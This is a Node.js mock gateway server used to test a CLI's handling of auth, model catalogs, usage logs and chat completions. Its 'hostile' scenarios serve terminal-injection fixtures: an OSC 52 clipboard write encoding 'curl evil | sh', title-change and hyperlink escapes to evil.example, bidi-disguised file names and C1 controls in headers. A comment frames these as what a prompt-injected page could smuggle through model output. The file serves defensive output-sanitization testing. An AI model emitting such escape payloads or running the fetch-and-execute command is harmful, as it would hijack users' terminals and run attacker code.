// Standalone test double for the gateway's identity + token + catalog +
// chat-completions endpoints, run as its OWN process by test helpers via
// withMockGateway. It must be a separate process (not an in-test-process
// server) because specs drive the CLI with execFile, and a shared local
// server keeps the child from hanging on a blocked parent event loop. Zero
// dependencies, node:http only.
//
// Route selection is by path prefix so each test picks a behavior through
// AIAND_BASE_URL (the client builds URLs as baseUrl + path, so a prefix in
// the base URL routes here):
//   /stub/429/*          every identity endpoint answers 429 with Retry-After
//                        + X-RateLimit-Policy headers.
//   /stub/401/*          every identity endpoint answers 401.
//   /stub/401-then-200/* identity endpoints 401 unknown keys but 200 the
//                        rotated key; POST /auth/device/token mints it.
//   /stub/500/*          every endpoint answers 500 (gateway outage).
//   /stub/two-orgs/*     /api/orgs lists two Orgs (First Org, Second Org).
//   /stub/vision-catalog/* /v1/models serves one vision + one text-only model.
//   /stub/logs-window/*  /logs serves three wire-format rows (2 inside the
//                        last 20 minutes, one 2h old) for windowed --verify.
//   /stub/logs-window-drift/* the same, with win-0001 carrying 100 extra
//                        output tokens — a real in-window divergence.
//   /stub/hostile/*      chat completions carry HOSTILE_TEXT / HOSTILE_REASONING
//                        (OSC 52, OSC 0); streamed, each escape is split across
//                        SSE events. Identity, orgs and the logs error body
//                        carry escapes, CR, newlines and bidi overrides too.
//   /stub/hostile-headers/* chat completions answer with C1 controls (an 8-bit OSC
//                        title and an 8-bit CSI) in the model, cost, effort and
//                        request-id headers, which the CLI prints in its footer;
//                        model "m/error" answers 400 with a hostile message and request id.
//   (no prefix)          happy path: 200 identity + orgs.
//
// POST /v1/messages answers "mock:<label> model=<model>". --log <file> appends
// one JSON line per request, --label names this gateway, --cert/--key serve HTTPS.
//
// Response shapes match src/api/account.ts (/api/user, /api/orgs) and
// src/api/device.ts rotateTokens (/auth/device/token) exactly, and the 429
// headers match src/api/client.ts HEADERS.RATE_LIMIT_POLICY plus Retry-After.
// /v1/models returns a small catalog that includes the curated preferred
// default (zai-org/glm-5.3). POST /v1/chat/completions echoes the request
// model so run/chat default-resolution tests can assert what the CLI sent.
//
// Standalone use: `node test/mock-gateway.mjs --port 0` prints one JSON line
// {"port":<actual>} on stdout and serves until killed.
import { appendFileSync, readFileSync } from "node:fs";
import { createServer } from "node:http";
import { createServer as createTlsServer } from "node:https";

const NEW_ACCESS = "sk-new-mock-token";
const NEW_REFRESH = "rt-new-mock-token";

const HAPPY_USER = { id: "u1", email: "happy@example.com" };
const HAPPY_ORGS = [{ id: "org_1", name: "Happy Org" }];
const REFRESH_USER = { id: "u1", email: "refreshed@example.com" };
const REFRESH_ORGS = [{ id: "org_1", name: "Refreshed Org" }];
const TWO_ORGS = [
  { id: "org_1", name: "First Org" },
  { id: "org_2", name: "Second Org" },
];

function catalogModel(id, capabilities = ["tools"]) {
  return {
    id,
    name: id,
    object: "model",
    created: 0,
    owned_by: "aiand",
    provider: "aiand",
    context_window: 128000,
    max_output_tokens: 32768,
    capabilities,
    reasoning_efforts: null,
    reasoning_effort_default: null,
    description: null,
    currency: "usd",
    input_per_1m: "1",
    output_per_1m: "1",
    cached_input_per_1m: null,
  };
}

// openai/gpt-5 first so a wrong "first catalog entry" default is distinguishable
// from resolveDefault's curated preference for zai-org/glm-5.3.
const CATALOG = [
  catalogModel("openai/gpt-5"),
  catalogModel("zai-org/glm-5.3"),
  catalogModel("deepseek-ai/deepseek-v4-flash"),
];

// deliberately different windows expose a shared/minimum-window hint.
const CONTEXT_CATALOG = [
  ...CATALOG.map((model, index) => ({
    ...model,
    context_window: [32768, 1048576, 262144][index],
  })),
  { ...catalogModel("vendor/custom[1m]"), context_window: 524288 },
];

const VISION_CATALOG = [
  catalogModel("vendor/vision-model", ["vision", "tool_calling"]),
  catalogModel("vendor/text-model", ["tool_calling"]),
];

// #96: rows served by the `logs-window` scenarios. `null` until the first
// /logs request builds them, so one mock process serves one consistent
// fixture across its sync + verify calls.
let WINDOW_ROWS = null;
function buildWindowRows() {
  // The gateway's verbatim wire format (space separator, `+00` offset) —
  // the exact shape the #86 store normalization and the OBS-BF-11 remote
  // filter both have to parse.
  const wireFormat = (date) =>
    `${date.toISOString().slice(0, 10)} ${date.toISOString().slice(11, 23)}+00`;
  const ago = (ms) => wireFormat(new Date(Date.now() - ms));
  const row = (id, created_at, input_tokens, output_tokens, cost) => ({
    id,
    model: "test/model",
    api_key: "sk-abcd...1234",
    status_code: 200,
    ttft_ms: 120,
    latency_ms: 1_400,
    input_tokens,
    output_tokens,
    cached_tokens: 0,
    cost,
    currency: "usd",
    created_at,
  });
  return [
    row("win-0001", ago(5 * 60_000), 1_000, 300, "0.0042"),
    row("win-0002", ago(15 * 60_000), 2_000, 500, "0.0100"),
    // Outside a 20-minute verify window: exercises the remote-side filter.
    row("win-0003", ago(2 * 3_600_000), 4_000, 700, "0.0200"),
  ];
}

// A clipboard write and a window title, the way a prompt-injected page would
// smuggle them through a model's answer and reasoning.
const HOSTILE_TEXT = ["safe ", "\x1b]52;c;", "Y3VybCBldmlsIHwgc2g=", "\x1b", "\\", "after\n"];
const HOSTILE_REASONING = ["\x1b]0", ";pwned", "\x07", "pondering"];

const HOSTILE_USER = { id: "u1", email: "mallory@example.com\x1b]52;c;Y3VybA==\x07" };
const HOSTILE_ORGS = [
  { id: "org_1", name: "Evil\x1b]8;;https://evil.example\x1b\\Corp\x1b]8;;\x1b\\\nInjected row" },
  { id: "org_2", name: "株式会社\u202Egnp.exe\x1b[2J\rテスト" },
];
// Header values may carry 0x80-0xFF, so C1 controls (which a terminal acts on
// as an escape introducer) are the hostile bytes a header can hold.
const HOSTILE_HEADERS = {
  "X-Model": "m/x\x9d0;pwned-title\x9c",
  "X-Cost": "0.01\x9b2J",
  "X-Cost-Currency": "usd\x85",
  "X-Reasoning-Effort": "high\x9b1A",
  "X-Request-ID": "req-\x9d52;c;Y3VybA==\x9c1",
};
const HOSTILE_ERROR = "bad request\x1b]0;pwned\x07\x1b[1A\x1b[2K\u202Eevil";

function replyHostileStream(res, model) {
  res.writeHead(200, { "Content-Type": "text/event-stream" });
  const event = (delta) =>
    res.write(`data: ${JSON.stringify({ model, choices: [{ index: 0, delta }] })}\n\n`);
  for (const piece of HOSTILE_REASONING) event({ reasoning_content: piece });
  for (const piece of HOSTILE_TEXT) event({ content: piece });
  res.write(
    `data: ${JSON.stringify({ model, choices: [{ index: 0, delta: {}, finish_reason: "stop" }], usage: { prompt_tokens: 1, completion_tokens: 1 } })}\n\n`,
  );
  res.end("data: [DONE]\n\n");
}

function reply(res, status, body, headers = {}) {
  res.writeHead(status, { "Content-Type": "application/json", ...headers });
  res.end(JSON.stringify(body));
}

function reply429(res) {
  reply(
    res,
    429,
    { error: "rate_limited", error_description: "Too many requests." },
    { "Retry-After": "7", "X-RateLimit-Policy": "burst;w=60" },
  );
}

function reply401(res) {
  reply(res, 401, { error: "unauthorized" });
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    let raw = "";
    req.on("data", (chunk) => (raw += chunk));
    req.on("end", () => resolve(raw));
    req.on("error", reject);
  });
}

/** A client that aborts mid-body rejects readBody; the reply was never
 * going out, so swallow the rejection instead of crashing the mock. */
function handleBody(req, fn) {
  readBody(req)
    .then(fn)
    .catch(() => {});
}

/** Split an optional /stub/<scenario> prefix off the pathname. */
function splitScenario(pathname) {
  const parts = pathname.split("/");
  if (parts[1] === "stub" && parts[2]) {
    const rest = `/${parts.slice(3).join("/")}`;
    return { scenario: parts[2], rest: rest === "/" ? "/" : rest };
  }
  return { scenario: "happy", rest: pathname };
}

let label = "mock";
let logFile = "";
let cert = "";
let key = "";

function logRequest(req, pathname, raw) {
  if (!logFile) return;
  let body = {};
  try {
    body = raw ? JSON.parse(raw) : {};
  } catch {
    body = {};
  }
  const text = typeof raw === "string" ? raw : "";
  const lastUser = [...(body.messages ?? [])].reverse().find((m) => m.role === "user");
  const content = lastUser?.content;
  const prompt =
    typeof content === "string"
      ? content
      : Array.isArray(content)
        ? content
            .filter((part) => part.type === "text" && !part.text.startsWith("<"))
            .map((part) => part.text)
            .join(" ")
        : "";
  appendFileSync(
    logFile,
    `${JSON.stringify({
      t: Date.now(),
      label,
      method: req.method,
      path: pathname,
      model: body.model ?? null,
      cwd: /\/work\/([A-Za-z0-9_-]+)/.exec(text)?.[1] ?? null,
      prompt: prompt.slice(-200),
      auth: (req.headers.authorization ?? req.headers["x-api-key"] ?? "").toString().slice(0, 24),
    })}\n`,
  );
}

function replyMessages(res, body) {
  const model = body.model ?? "";
  const text = `mock:${label} model=${model}`;
  const usage = { input_tokens: 1, output_tokens: 1 };
  if (!body.stream) {
    return reply(res, 200, {
      id: "msg_mock",
      type: "message",
      role: "assistant",
      model,
      content: [{ type: "text", text }],
      stop_reason: "end_turn",
      stop_sequence: null,
      usage,
    });
  }
  res.writeHead(200, { "Content-Type": "text/event-stream", "Cache-Control": "no-cache" });
  const send = (event, data) => res.write(`event: ${event}\ndata: ${JSON.stringify(data)}\n\n`);
  send("message_start", {
    type: "message_start",
    message: {
      id: "msg_mock",
      type: "message",
      role: "assistant",
      model,
      content: [],
      stop_reason: null,
      stop_sequence: null,
      usage,
    },
  });
  send("content_block_start", {
    type: "content_block_start",
    index: 0,
    content_block: { type: "text", text: "" },
  });
  send("content_block_delta", {
    type: "content_block_delta",
    index: 0,
    delta: { type: "text_delta", text },
  });
  send("content_block_stop", { type: "content_block_stop", index: 0 });
  send("message_delta", {
    type: "message_delta",
    delta: { stop_reason: "end_turn", stop_sequence: null },
    usage: { output_tokens: 1 },
  });
  send("message_stop", { type: "message_stop" });
  res.end();
}

function handle(req, res) {
  const url = new URL(req.url ?? "/", "http://127.0.0.1");
  const { scenario, rest } = splitScenario(url.pathname);

  if (logFile && req.method !== "POST") logRequest(req, url.pathname, "");

  if (rest === "/v1/messages" && req.method === "POST") {
    handleBody(req, (raw) => {
      logRequest(req, url.pathname, raw);
      if (res.writableEnded) return;
      let body = {};
      try {
        body = JSON.parse(raw);
      } catch {
        return reply(res, 400, { type: "error", error: { type: "invalid_request_error" } });
      }
      replyMessages(res, body);
    });
    return;
  }

  if (rest === "/v1/messages/count_tokens" && req.method === "POST") {
    handleBody(req, (raw) => {
      logRequest(req, url.pathname, raw);
      if (!res.writableEnded) reply(res, 200, { input_tokens: 1 });
    });
    return;
  }

  if (scenario === "500") return reply(res, 500, { error: "gateway is down" });

  if (rest === "/api/user" || rest === "/api/orgs") {
    const isUser = rest === "/api/user";
    if (scenario === "429") return reply429(res);
    if (scenario === "401") return reply401(res);
    if (scenario === "401-then-200") {
      // Unknown keys are rejected; the rotated key succeeds. Both endpoints
      // check so the CLI's parallel user+orgs fetch converges after refresh.
      if (req.headers.authorization === `Bearer ${NEW_ACCESS}`) {
        return reply(res, 200, isUser ? REFRESH_USER : REFRESH_ORGS);
      }
      return reply401(res);
    }
    if (scenario === "two-orgs") return reply(res, 200, isUser ? HAPPY_USER : TWO_ORGS);
    if (scenario === "hostile") return reply(res, 200, isUser ? HOSTILE_USER : HOSTILE_ORGS);
    return reply(res, 200, isUser ? HAPPY_USER : HAPPY_ORGS);
  }

  if (rest === "/auth/device/token" && req.method === "POST") {
    if (scenario === "429") return reply429(res);
    if (scenario === "401") return reply401(res);
    // Token rotation: always mint the same key so concurrent refresh retries
    // (the CLI fires user+orgs in parallel) converge on one credential.
    handleBody(req, () => {
      if (res.writableEnded) return;
      reply(res, 200, {
        access_token: NEW_ACCESS,
        refresh_token: NEW_REFRESH,
        token_type: "Bearer",
        expires_in: 2592000,
      });
    });
    return;
  }

  if (rest === "/logs") {
    if (scenario === "logs-404") return reply(res, 404, { error: "not_found" });
    // #63: the accuracy gate verifies against /logs, so the 401 stub must
    // cover it too (a gateway auth failure must never verify as green).
    if (scenario === "401") return reply401(res);
    // #94: the gateway's paired-cursor contract violation, verbatim from the
    // raw probes. `logs-400` always rejects /logs with it (for driving the
    // error surface); `logs-400-pair` rejects only requests carrying exactly
    // one of after/after_id (the real contract shape).
    if (scenario === "logs-400") {
      return reply(res, 400, { error: "after and after_id must be sent together" });
    }
    if (scenario === "logs-400-pair") {
      const after = url.searchParams.get("after");
      const afterId = url.searchParams.get("after_id");
      if (Boolean(after) !== Boolean(afterId)) {
        return reply(res, 400, { error: "after and after_id must be sent together" });
      }
      return reply(res, 200, { data: [], has_more: false, next_after: null, next_after_id: null });
    }
    // #94: the pinned /logs semantics, probed raw on 2026-10-27 — newest-first
    // always, `after` an exclusive floor, `after_id` only breaking ties at the
    // anchor timestamp, and after/after_id required together. Rows come from
    // the JSON file named by AIAND_MOCK_LOG_FILE (gateway LogEntry shape, any
    // order — served newest-first); re-read per request so tests can land new
    // traffic between syncs by rewriting the file.
    if (scenario === "logs-pinned" || scenario === "logs-pinned-file") {
      // `logs-pinned-file` reads a per-test rows file from
      // AIAND_MOCK_LOG_FILE_<n> (the CLI child's env carries it), so tests
      // with concurrent run children don't share one rows file.
      const envName =
        scenario === "logs-pinned-file"
          ? (process.env.AIAND_MOCK_LOG_FILE_VAR ?? "AIAND_MOCK_LOG_FILE")
          : "AIAND_MOCK_LOG_FILE";
      let rows = [];
      try {
        const file = process.env[envName];
        rows = JSON.parse(file ? readFileSync(file, "utf8") : "[]");
      } catch {
        rows = [];
      }
      // Newest-first by INSTANT, not text: wire-format rows (`… …+00`, space
      // separator) must order above same-day ISO rows, exactly as the real
      // gateway orders them — a text sort puts `' '` before `'T'` and
      // misorders the burst that pins the #94 early-stop fix.
      const instant = (e) => Date.parse(e.created_at.replace(" ", "T").replace(/\+00$/, "Z"));
      const newestFirst = [...rows].sort((a, b) =>
        instant(a) < instant(b) ? 1 : instant(a) > instant(b) ? -1 : b.id.localeCompare(a.id),
      );
      const after = url.searchParams.get("after");
      const afterId = url.searchParams.get("after_id");
      if (Boolean(after) !== Boolean(afterId)) {
        return reply(res, 400, { error: "after and after_id must be sent together" });
      }
      let remaining = newestFirst;
      if (after) {
        // Cursor semantics: (after, after_id) names the LAST row served; the
        // next page continues downward — strictly older rows, with after_id
        // breaking ties at exactly the anchor timestamp. Compared as
        // instants, for the same wire-vs-ISO reason as the sort above.
        const afterMs = Date.parse(after.replace(" ", "T").replace(/\+00$/, "Z"));
        remaining = newestFirst.filter((e) => {
          const ms = instant(e);
          return ms < afterMs || (ms === afterMs && afterId !== null && e.id < afterId);
        });
      }
      const limit = Math.max(0, Math.min(100, Number(url.searchParams.get("limit") ?? 100)));
      const data = remaining.slice(0, limit);
      const last = data[data.length - 1];
      const hasMore = remaining.length > data.length;
      return reply(res, 200, {
        data,
        has_more: hasMore,
        next_after: hasMore && last ? last.created_at : null,
        next_after_id: hasMore && last ? last.id : null,
      });
    }
    // #96: wire-format rows for windowed `usage --verify` — two inside the
    // last 20 minutes, one 2h old. Built ONCE on first request so the sync
    // and the verify fetch see identical created_at values (fresh timestamps
    // per request would slide past the sync watermark and double-count).
    if (scenario === "logs-window" || scenario === "logs-window-drift") {
      if (WINDOW_ROWS === null) WINDOW_ROWS = buildWindowRows();
      const data =
        scenario === "logs-window-drift"
          ? WINDOW_ROWS.map((r) =>
              r.id === "win-0001" ? { ...r, output_tokens: r.output_tokens + 100 } : r,
            )
          : WINDOW_ROWS;
      return reply(res, 200, { data, has_more: false, next_after: null, next_after_id: null });
    }
    if (scenario === "hostile") return reply(res, 400, { error: { message: HOSTILE_ERROR } });
    return reply(res, 200, { data: [], has_more: false, next_after: null, next_after_id: null });
  }

  if (rest === "/v1/models") {
    if (scenario === "429") return reply429(res);
    if (scenario === "401") return reply401(res);
    if (scenario === "catalog-down") return reply(res, 500, { error: "catalog_unavailable" });
    if (scenario === "context-catalog")
      return reply(res, 200, { object: "list", data: CONTEXT_CATALOG });
    if (scenario === "vision-catalog")
      return reply(res, 200, { object: "list", data: VISION_CATALOG });
    return reply(res, 200, { object: "list", data: CATALOG });
  }

  if (rest === "/v1/chat/completions" && req.method === "POST") {
    if (scenario === "429") return reply429(res);
    if (scenario === "401") return reply401(res);
    // catalog-down still serves completions so a configured profile model can send.
    handleBody(req, (raw) => {
      if (res.writableEnded) return;
      let model = "";
      let stream = false;
      try {
        ({ model = "", stream = false } = JSON.parse(raw));
      } catch {
        model = "";
      }
      if (scenario === "hostile-headers" && model === "m/error") {
        return reply(res, 400, { error: { message: HOSTILE_ERROR } }, HOSTILE_HEADERS);
      }
      if (scenario === "hostile" && stream) return replyHostileStream(res, model);
      const hostile = scenario === "hostile";
      if (scenario === "hostile-headers" && stream) {
        res.writeHead(200, { "Content-Type": "text/event-stream", ...HOSTILE_HEADERS });
        res.write(
          `data: ${JSON.stringify({ model, choices: [{ index: 0, delta: { content: "ok\n" } }] })}\n\n`,
        );
        res.write(
          `data: ${JSON.stringify({ model, choices: [{ index: 0, delta: {}, finish_reason: "stop" }], usage: { prompt_tokens: 1, completion_tokens: 1 } })}\n\n`,
        );
        return res.end("data: [DONE]\n\n");
      }
      reply(
        res,
        200,
        {
          id: "chatcmpl-mock",
          object: "chat.completion",
          model,
          choices: [
            {
              index: 0,
              message: {
                role: "assistant",
                content: hostile ? HOSTILE_TEXT.join("") : `echo:${model}`,
                ...(hostile ? { reasoning_content: HOSTILE_REASONING.join("") } : {}),
              },
              finish_reason: "stop",
            },
          ],
          usage: { prompt_tokens: 1, completion_tokens: 1, total_tokens: 2 },
        },
        scenario === "hostile-headers" ? HOSTILE_HEADERS : {},
      );
    });
    return;
  }

  reply(res, 404, { error: "not found" });
}

let port = 0;
for (let i = 2; i < process.argv.length; i += 1) {
  const arg = process.argv[i] ?? "";
  if (arg === "--port") {
    const raw = process.argv[i + 1] ?? "";
    port = Number(raw);
    if (!/^\d+$/.test(raw) || port < 0 || port > 65535) {
      process.stderr.write(`mock-gateway: invalid --port value: ${raw}\n`);
      process.exit(1);
    }
    i += 1;
  } else if (arg === "--label" || arg === "--log" || arg === "--cert" || arg === "--key") {
    const value = process.argv[i + 1] ?? "";
    if (arg === "--label") label = value;
    else if (arg === "--log") logFile = value;
    else if (arg === "--cert") cert = value;
    else key = value;
    i += 1;
  } else if (arg.startsWith("--port=")) {
    const raw = arg.slice("--port=".length);
    port = Number(raw);
    if (!/^\d+$/.test(raw) || port < 0 || port > 65535) {
      process.stderr.write(`mock-gateway: invalid --port value: ${raw}\n`);
      process.exit(1);
    }
  }
}

const server =
  cert && key
    ? createTlsServer({ cert: readFileSync(cert), key: readFileSync(key) }, handle)
    : createServer(handle);

server.on("error", (error) => {
  process.stderr.write(`mock-gateway: listen failed: ${error.message}\n`);
  process.exit(1);
});

server.listen(port, process.env.MOCK_GATEWAY_HOST || "127.0.0.1", () => {
  const address = server.address();
  const actual = address && typeof address === "object" ? address.port : port;
  process.stdout.write(`${JSON.stringify({ port: actual })}\n`);
});
